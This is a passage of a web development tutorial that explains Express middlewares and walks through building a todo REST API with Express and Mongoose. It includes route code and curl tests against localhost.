<p><img src="/images/express-middlewares.png" alt="ExpressJS Middlewares"></p>
<p>Let‚Äôs give some examples of middlewares to drive the point home.</p>
<p>Say you want to log the IP of the client on each request:</p>
<figure class="highlight javascript"><figcaption><span>Log the client IP on every request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ip = req.headers[<span class="string">'x-forwarded-for'</span>] || req.connection.remoteAddress;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Client IP:'</span>, ip);</span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Notice that each middleware has 3 parameters:</p>
<ul>
<li><code>req</code>: contain all the requests objects like URLs, path, ‚Ä¶</li>
<li><code>res</code>: is the response object where we can send the reply back to the client.</li>
<li><code>next</code>: continue with the next middleware in the chain.</li>
</ul>
<p>You can also specify a path that you want the middleware to activate on.</p>
<figure class="highlight javascript"><figcaption><span>Middleware mounted on "/todos/:id" and log the request method</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/todos/:id'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Request Type:'</span>, req.method);</span><br><span class="line">  next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>And finally you can use <code>app.get</code> to catch GET requests with matching routes, reply the request with a <code>response.send</code> and end the middleware chain. Let‚Äôs use what we learned on <a href="#mongoose-read-and-query">mongoose read</a> to reply with the user‚Äôs data that matches the <code>id</code>.</p>
<figure class="highlight javascript"><figcaption><span>Middleware mounted on "/todos/:id" and returns</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/todos/:id'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.findById(req.params.id, <span class="function"><span class="keyword">function</span>(<span class="params">err, todo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) res.send(err);</span><br><span class="line">    res.json(todo);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Notice that all previous middlewares called <code>next()</code> except this last one, because it sends a response (in JSON) to the client with the requested <code>todo</code> data.</p>
<p>Hopefully, you don‚Äôt have to develop a bunch of middlewares besides routes, since ExpressJS has a bunch of middlewares available.</p>
<h2 id="Default-Express-4-0-middlewares">Default Express 4.0 middlewares<a href="#Default-Express-4-0-middlewares" class="headerlink" title="Default Express 4.0 middlewares"></a></h2><ul>
<li><p><a href="https://github.com/expressjs/morgan" target="_blank">morgan</a>: logger</p>
</li>
<li><p><a href="https://github.com/expressjs/body-parser" target="_blank">body-parser</a>: parse the body so you can access parameters in requests in <code>req.body</code>. e.g. <code>req.body.name</code>.</p>
</li>
<li><p><a href="https://github.com/expressjs/cookie-parser" target="_blank">cookie-parser</a>: parse the cookies so you can access parameters in cookies <code>req.cookies</code>. e.g. <code>req.cookies.name</code>.</p>
</li>
<li><p><a href="https://github.com/expressjs/serve-favicon" target="_blank">serve-favicon</a>: exactly that, serve favicon from route <code>/favicon.ico</code>. Should be call on the top before any other routing/middleware takes place to avoids unnecessary parsing.</p>
</li>
</ul>
<h2 id="Other-ExpressJS-Middlewares">Other ExpressJS Middlewares<a href="#Other-ExpressJS-Middlewares" class="headerlink" title="Other ExpressJS Middlewares"></a></h2><p>The following middlewares are not added by default, but it‚Äôs nice to know they exist at least:</p>
<ul>
<li><p><a href="https://github.com/expressjs/compression" target="_blank">compression</a>: compress all request. e.g. <code>app.use(compression())</code></p>
</li>
<li><p><a href="https://github.com/expressjs/session" target="_blank">session</a>: create sessions. e.g. <code>app.use(session({secret: &#39;Secr3t&#39;}))</code></p>
</li>
<li><p><a href="https://github.com/expressjs/method-override" target="_blank">method-override</a>: <code>app.use(methodOverride(&#39;_method&#39;))</code> Override methods to the one specified on the <code>_method</code> param. e.g. <code>GET /resource/1?_method=DELETE</code> will become <code>DELETE /resource/1</code>.</p>
</li>
<li><p><a href="https://github.com/expressjs/response-time" target="_blank">response-time</a>: <code>app.use(responseTime())</code> adds <code>X-Response-Time</code> header to responses.</p>
</li>
<li><p><a href="https://github.com/expressjs/errorhandler" target="_blank">errorhandler</a>: Aid development, by sending full error stack traces to the client when an error occurs. <code>app.use(errorhandler())</code>. It is good practice to surround it with an if statement to check <code>process.env.NODE_ENV === &#39;development&#39;</code>.</p>
</li>
<li><p><a href="https://github.com/expressjs/vhost" target="_blank">vhost</a>: Allows you to use different stack of middlewares depending on the request <code>hostname</code>. e.g. <code>app.use(vhost(&#39;*.user.local&#39;, userapp))</code> and <code>app.use(vhost(&#39;assets-*.example.com&#39;, staticapp))</code> where <code>userapp</code> and <code>staticapp</code> are different express instances with different middlewares.</p>
</li>
<li><p><a href="https://github.com/expressjs/csurf" target="_blank">csurf</a>: Adds a <strong>C</strong>ross-<strong>s</strong>ite <strong>r</strong>equest <strong>f</strong>orgery (CSRF) protection by adding a token to responds either via <code>session</code> or <code>cookie-parser</code> middleware. <code>app.use(csrf());</code></p>
</li>
<li><p><a href="https://github.com/expressjs/timeout" target="_blank">timeout</a>: halt execution if it takes more that a given time. e.g. <code>app.use(timeout(&#39;5s&#39;));</code>. However you need to check by yourself under every request with a middleware that checks <code>if (!req.timedout) next();</code>.</p>
</li>
</ul>
<h1 id="Wiring-up-the-MEAN-Stack">Wiring up the MEAN Stack<a href="#Wiring-up-the-MEAN-Stack" class="headerlink" title="Wiring up the MEAN Stack"></a></h1><p>In the next sections, we are going to put together everything that we learn from and build an API. They can be consume by browsers, mobile apps and even other servers.
<img src="/images/api_uses.png" title="API Consumers"></p>
<h2 id="Bootstrapping-ExpressJS">Bootstrapping ExpressJS<a href="#Bootstrapping-ExpressJS" class="headerlink" title="Bootstrapping ExpressJS"></a></h2><p>After a detour in the land of Node, MongoDB, Mongoose, and middlewares, we are back to our express todoApp. This time to create the routes and finalize our RESTful API.</p>
<p>Express has a separate package called <code>express-generator</code>, which can help us to get started with out API.</p>
<figure class="highlight bash"><figcaption><span>Install and run "express-generator"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install it globally using -g</span></span><br><span class="line">npm install express-generator -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># create todo-app API with EJS views (instead the default Jade)</span></span><br><span class="line">express todo-api -e</span><br><span class="line"></span><br><span class="line"><span class="comment">#   create : todo-api</span></span><br><span class="line"><span class="comment">#   create : todo-api/package.json</span></span><br><span class="line"><span class="comment">#   create : todo-api/app.js</span></span><br><span class="line"><span class="comment">#   create : todo-api/public</span></span><br><span class="line"><span class="comment">#   create : todo-api/public/javascripts</span></span><br><span class="line"><span class="comment">#   create : todo-api/routes</span></span><br><span class="line"><span class="comment">#   create : todo-api/routes/index.js</span></span><br><span class="line"><span class="comment">#   create : todo-api/routes/users.js</span></span><br><span class="line"><span class="comment">#   create : todo-api/public/stylesheets</span></span><br><span class="line"><span class="comment">#   create : todo-api/public/stylesheets/style.css</span></span><br><span class="line"><span class="comment">#   create : todo-api/views</span></span><br><span class="line"><span class="comment">#   create : todo-api/views/index.ejs</span></span><br><span class="line"><span class="comment">#   create : todo-api/views/layout.ejs</span></span><br><span class="line"><span class="comment">#   create : todo-api/views/error.ejs</span></span><br><span class="line"><span class="comment">#   create : todo-api/public/images</span></span><br><span class="line"><span class="comment">#   create : todo-api/bin</span></span><br><span class="line"><span class="comment">#   create : todo-api/bin/www</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   install dependencies:</span></span><br><span class="line"><span class="comment">#     $ cd todo-api &amp;&amp; npm install</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   run the app on Linux/Mac:</span></span><br><span class="line"><span class="comment">#     $ DEBUG=todo-app:* npm start</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   run the app on Windows:</span></span><br><span class="line"><span class="comment">#     $ SET DEBUG=todo-api:* &amp; npm start</span></span><br></pre></td></tr></table></figure>
<p>This will create a new folder called <code>todo-api</code>. Let‚Äôs go ahead and install the dependencies and run the app:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install dependencies</span></span><br><span class="line"><span class="built_in">cd</span> todo-api &amp;&amp; npm install</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the app on Linux/Mac</span></span><br><span class="line">PORT=4000 npm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the app on Windows</span></span><br><span class="line">SET PORT=4000 &amp; npm start</span><br></pre></td></tr></table></figure>
<p>Use your browser to go to <a href="http://0.0.0.0:4000" target="_blank" rel="noopener">http://0.0.0.0:4000</a>, and you should see a message ‚ÄúWelcome to Express‚Äù</p>
<h2 id="Connect-ExpressJS-to-MongoDB">Connect ExpressJS to MongoDB<a href="#Connect-ExpressJS-to-MongoDB" class="headerlink" title="Connect ExpressJS to MongoDB"></a></h2><p>In this section we are going to access MongoDB using our newly created express app. Hopefully, you have installed MongoDB in the <a href="#mongodb">setup section</a>, and you can start it by typing (if you haven‚Äôt yet):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod</span><br></pre></td></tr></table></figure>
<p>Install the MongoDB driver for NodeJS called mongoose:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mongoose --save</span><br></pre></td></tr></table></figure>
<p>Notice <code>--save</code>. It will add it to the <code>todo-api/package.json</code></p>
<p>Next, you need to require mongoose in the <code>todo-api/app.js</code></p>
<figure class="highlight javascript"><figcaption><span>Add to app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load mongoose package</span></span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use native Node promises</span></span><br><span class="line">mongoose.Promise = global.Promise;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to MongoDB</span></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost/todo-api'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">()</span> =&gt;</span>  <span class="built_in">console</span>.log(<span class="string">'connection succesful'</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> <span class="built_in">console</span>.error(err));</span><br></pre></td></tr></table></figure>
<p>Now, When you run <code>npm start</code> or <code>./bin/www</code>, you will notice the message <code>connection successful</code>. Great!</p>
<p>You can find the repository <a href="https://github.com/amejiarosario/todoAPIjs" target="_blank" rel="noopener">here</a> and the diff code at this point:
<a href="https://github.com/amejiarosario/todoAPIjs/commit/948a32391d208dd1303d67b443456a377e93fb8d" target="_blank" rel="noopener">diff</a></p>
<h2 id="Creating-the-Todo-model-with-Mongoose">Creating the Todo model with Mongoose<a href="#Creating-the-Todo-model-with-Mongoose" class="headerlink" title="Creating the Todo model with Mongoose"></a></h2><p>It‚Äôs show time! All the above was setup and preparation for this moment. Let bring the API to life.</p>
<p>Create a <code>models</code> directory and a <code>Todo.js</code> model:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir models</span><br><span class="line">touch models/Todo.js</span><br></pre></td></tr></table></figure>
<p>In the <code>models/Todo.js</code>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> TodoSchema = <span class="keyword">new</span> mongoose.Schema(&#123;</span><br><span class="line">  name: <span class="built_in">String</span>,</span><br><span class="line">  completed: <span class="built_in">Boolean</span>,</span><br><span class="line">  note: <span class="built_in">String</span>,</span><br><span class="line">  updated_at: &#123; <span class="attr">type</span>: <span class="built_in">Date</span>, <span class="attr">default</span>: <span class="built_in">Date</span>.now &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = mongoose.model(<span class="string">'Todo'</span>, TodoSchema);</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/afc908027339b22f10de3b77518ac0728668d470" target="_blank" rel="noopener">diff</a></p>
<p>What‚Äôs going on up there? Isn‚Äôt MongoDB suppose to be schemaless? Well, it is schemaless and very flexible indeed. However, very often we want bring sanity to our API/WebApp through validations and enforcing a schema to keep a consistent structure. Mongoose does that for us, which is nice.</p>
<p>You can use the following types:</p>
<ul>
<li>String</li>
<li>Boolean</li>
<li>Date</li>
<li>Array</li>
<li>Number</li>
<li>ObjectId</li>
<li>Mixed</li>
<li>Buffer</li>
</ul>
<h1 id="API-clients-Browser-Postman-and-curl">API clients (Browser, Postman and curl)<a href="#API-clients-Browser-Postman-and-curl" class="headerlink" title="API clients (Browser, Postman and curl)"></a></h1><p>I know you have not created any route yet. However, in the next sections you will. These are just three ways to retrieve, change and delete data from your future API.</p>
<h2 id="Curl">Curl<a href="#Curl" class="headerlink" title="Curl"></a></h2><figure class="highlight bash"><figcaption><span>Create tasks</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create task</span></span><br><span class="line">curl -XPOST http://localhost:3000/todos -d <span class="string">'name=Master%20Routes&amp;completed=false&amp;note=soon...'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># List tasks</span></span><br><span class="line">curl -XGET http://localhost:3000/todos</span><br></pre></td></tr></table></figure>
<h2 id="Browser-and-Postman">Browser and Postman<a href="#Browser-and-Postman" class="headerlink" title="Browser and Postman"></a></h2><p>If you open your browser and type <code>localhost:3000/todos</code> you will see all the tasks (when you implement it). However, you cannot do post commands by default. For further testing let‚Äôs use a Chrome plugin called <a href="https://chrome.google.com/webstore/detail/postman-rest-client/fdmmgilgnpjigdojojpjoooidkmcomcm?hl=en" target="_blank">Postman</a>. It allows you to use all the HTTP VERBS easily and check <code>x-www-form-urlencoded</code> for adding parameters.</p>
<img src="/images/postman_post.png" title="Postman POST example">
<blockquote>
<p>Don‚Äôt forget to check <code>x-www-form-urlencoded</code> or it won‚Äôt work ;)</p>
</blockquote>
<h2 id="Websites-and-Mobile-Apps">Websites and Mobile Apps<a href="#Websites-and-Mobile-Apps" class="headerlink" title="Websites and Mobile Apps"></a></h2><p>Probably these are the main consumers of APIs. You can interact with RESTful APIs using jQuery‚Äôs <code>$ajax</code> and its wrappers, BackboneJS‚Äôs Collections/models, AngularJS‚Äôs <code>$http</code> or <code>$resource</code>, among many other libraries/frameworks and mobile clients.</p>
<p>In the end, we are going to explain how to use AngularJS to interact with this API.</p>
<h1 id="ExpressJS-Routes">ExpressJS Routes<a href="#ExpressJS-Routes" class="headerlink" title="ExpressJS Routes"></a></h1><p>To sum up we want to achieve the following:</p>
<table>
<thead>
<tr>
<th>Resource (URI)</th>
<th>POST (create)</th>
<th>GET (read)</th>
<th>PUT (update)</th>
<th>DELETE (destroy)</th>
</tr>
</thead>
<tbody>
<tr>
<td>/todos</td>
<td>create new task</td>
<td>list tasks</td>
<td>error</td>
<td>error</td>
</tr>
<tr>
<td>/todos/:id</td>
<td>error</td>
<td>show task :id</td>
<td>update task :id</td>
<td>destroy task ID 1</td>
</tr>
</tbody>
</table>
<p>Let‚Äôs setup the routes</p>
<figure class="highlight bash"><figcaption><span>Create a new route called `todos.js` in the `routes` folder or rename `users.js`</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv routes/users.js routes/todos.js</span><br></pre></td></tr></table></figure>
<p>In <code>app.js</code> add new <code>todos</code> route, or just replace <code>./routes/users</code> for <code>./routes/todos</code></p>
<figure class="highlight javascript"><figcaption><span>Adding todos routes</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> todos = <span class="built_in">require</span>(<span class="string">'./routes/todos'</span>);</span><br><span class="line">app.use(<span class="string">'/todos'</span>, todos);</span><br></pre></td></tr></table></figure>
<p>All set! Now, let‚Äôs go back and edit our <code>routes/todos.js</code>.</p>
<h2 id="List-GET-todos">List: GET /todos<a href="#List-GET-todos" class="headerlink" title="List: GET /todos"></a></h2><p>Remember <a href="#mongoose-read-and-query"> mongoose query api</a>? Here‚Äôs how to use it in this context:</p>
<figure class="highlight javascript"><figcaption><span>routes/todos.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"><span class="keyword">var</span> Todo = <span class="built_in">require</span>(<span class="string">'../models/Todo.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET /todos listing. */</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, todos</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> next(err);</span><br><span class="line">    res.json(todos);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p>Harvest time! We don‚Äôt have any task in database but at least we verify it is working:</p>
<figure class="highlight bash"><figcaption><span>Testing all together</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start database</span></span><br><span class="line">mongod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start Webserver (in other terminal tab)</span></span><br><span class="line">npm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test API (in other terminal tab)</span></span><br><span class="line">curl localhost:3000/todos</span><br><span class="line"><span class="comment"># =&gt; []%</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/54ab912ea9aa2b6633ae12816beb6e6c3d2702e6" target="_blank" rel="noopener">diff</a></p>
<p>If it returns an empty array <code>[]</code> you are all set. If you get errors, try going back and making sure you didn‚Äôt forget anything, or you can comment at the end of the post for help.</p>
<h2 id="Create-POST-todos">Create: POST /todos<a href="#Create-POST-todos" class="headerlink" title="Create: POST /todos"></a></h2><p>Back in <code>routes/todos.js</code>, we are going to add the ability to create using <a href="#mongoose-create">mongoose create</a>. Can you make it work before looking at the next example?</p>
<figure class="highlight javascript"><figcaption><span>routes/todos.js (showing just create route)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* POST /todos */</span></span><br><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.create(req.body, <span class="function"><span class="keyword">function</span> (<span class="params">err, post</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> next(err);</span><br><span class="line">    res.json(post);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/28b60c4bf9c6d8b08c3351f725e17c7f40a077be" target="_blank" rel="noopener">diff</a></p>
<p>A few things:</p>
<ul>
<li>We are using the <code>router.post</code> instead of <code>router.get</code>.</li>
<li>You have to stop and run the server again: <code>npm start</code>.</li>
</ul>
<p>Everytime you change a file you have to stop and start the web server. Let‚Äôs fix that using <code>nodemon</code> to refresh automatically:</p>
<figure class="highlight bash"><figcaption><span>Nodemon</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install nodemon globally</span></span><br><span class="line">npm install nodemon -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run web server with nodemon</span></span><br><span class="line">nodemon</span><br></pre></td></tr></table></figure>
<h2 id="Show-GET-todos-id">Show: GET /todos/:id<a href="#Show-GET-todos-id" class="headerlink" title="Show: GET /todos/:id"></a></h2><p>This is a snap with <a href="#mongoose-read-and-query"><code>Todo.findById</code></a> and <code>req.params</code>. Notice that <code>params</code> matches the placeholder name we set while defining the route. <code>:id</code> in this case.</p>
<figure class="highlight javascript"><figcaption><span>routes/todos.js (showing just show route)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET /todos/id */</span></span><br><span class="line">router.get(<span class="string">'/:id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.findById(req.params.id, <span class="function"><span class="keyword">function</span> (<span class="params">err, post</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> next(err);</span><br><span class="line">    res.json(post);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/7d8bc67178a4f162858395845c076d9223926bf8" target="_blank" rel="noopener">diff</a></p>
<p>Let‚Äôs test what we have so far!</p>
<figure class="highlight bash"><figcaption><span>Testing the API with Curl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start Web Server on port 4000 (default is 3000)</span></span><br><span class="line">PORT=4000 nodemon</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a todo using the API</span></span><br><span class="line">curl -XPOST http://localhost:4000/todos -d <span class="string">'name=Master%20Routes&amp;completed=false&amp;note=soon...'</span></span><br><span class="line"><span class="comment"># =&gt; &#123;"__v":0,"name":"Master Routes","completed":false,"note":"soon...","_id":"57a655997d2241695585ecf8"&#125;%</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get todo by ID (use the _id from the previous request, in my case "57a655997d2241695585ecf8")</span></span><br><span class="line">curl -XGET http://localhost:4000/todos/57a655997d2241695585ecf8</span><br><span class="line">&#123;<span class="string">"_id"</span>:<span class="string">"57a655997d2241695585ecf8"</span>,<span class="string">"name"</span>:<span class="string">"Master Routes"</span>,<span class="string">"completed"</span>:<span class="literal">false</span>,<span class="string">"note"</span>:<span class="string">"soon..."</span>,<span class="string">"__v"</span>:0&#125;%</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all elements (notice it is an array)</span></span><br><span class="line">curl -XGET http://localhost:4000/todos</span><br><span class="line">[&#123;<span class="string">"_id"</span>:<span class="string">"57a655997d2241695585ecf8"</span>,<span class="string">"name"</span>:<span class="string">"Master Routes"</span>,<span class="string">"completed"</span>:<span class="literal">false</span>,<span class="string">"note"</span>:<span class="string">"soon..."</span>,<span class="string">"__v"</span>:0&#125;]%</span><br></pre></td></tr></table></figure>
<h2 id="Update-PUT-todos-id">Update: PUT /todos/:id<a href="#Update-PUT-todos-id" class="headerlink" title="Update: PUT /todos/:id"></a></h2><p>Back in <code>routes/todos.js</code>, we are going to update tasks. This one you can do without looking at the example below, review <a href="#mongoose-update">findByIdAndUpdate</a> and give it a try!</p>
<figure class="highlight javascript"><figcaption><span>routes/todos.js (showing just update route)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PUT /todos/:id */</span></span><br><span class="line">router.put(<span class="string">'/:id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.findByIdAndUpdate(req.params.id, req.body, <span class="function"><span class="keyword">function</span> (<span class="params">err, post</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> next(err);</span><br><span class="line">    res.json(post);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/00dafe491e0d0b59fa53e86d8c187c42d7824200" target="_blank" rel="noopener">diff</a></p>
<figure class="highlight bash"><figcaption><span>curl update</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use the ID from the todo, in my case 57a655997d2241695585ecf8</span></span><br><span class="line">curl -XPUT http://localhost:4000/todos/57a655997d2241695585ecf8 -d <span class="string">"note=hola"</span></span><br><span class="line"><span class="comment"># =&gt; &#123;"_id":"57a655997d2241695585ecf8","name":"Master Routes","completed":true,"note":"hola","__v":0&#125;%</span></span><br></pre></td></tr></table></figure>
<h2 id="Destroy-DELETE-todos-id">Destroy: DELETE /todos/:id<a href="#Destroy-DELETE-todos-id" class="headerlink" title="Destroy: DELETE /todos/:id"></a></h2><p>Finally, the last one! Almost identical to <code>update</code>, use <a href="#mongoose-delete"><code>findByIdAndRemove</code></a>.</p>
<figure class="highlight javascript"><figcaption><span>routes/todos.js (showing just update route)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DELETE /todos/:id */</span></span><br><span class="line">router.delete(<span class="string">'/:id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  Todo.findByIdAndRemove(req.params.id, req.body, <span class="function"><span class="keyword">function</span> (<span class="params">err, post</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> next(err);</span><br><span class="line">    res.json(post);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/cbf5366e2b4e1a683ed50d2148ed6a548616d3f8" target="_blank" rel="noopener">diff</a></p>
<p>Is it working? Cool, you are done then!
